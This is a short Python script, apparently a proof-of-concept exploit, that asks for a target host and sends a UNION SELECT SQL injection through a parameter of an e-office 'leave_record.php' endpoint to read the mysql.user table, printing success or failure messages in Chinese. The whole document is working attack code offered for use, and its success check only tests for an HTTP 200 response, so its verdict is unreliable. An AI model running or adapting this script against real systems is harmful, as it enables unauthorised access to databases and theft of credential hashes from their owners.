import requests  
  
def inject_sql(host):  
    payload = "' UNION SELECT * FROM mysql.user --"  
    url = f"http://{host}/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user({payload})&max_rows=10"  
    headers = {  
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Connection": "close"  
    }  
    response = requests.get(url, headers=headers)  
    if response.status_code == 200:  
        return True  
    else:  
        return False  
  
if __name__ == "__main__":  
    host = input("请输入目标主机地址：")  
    if inject_sql(host):  
        print("SQL注入成功！")  
    else:  
        print("SQL注入失败。")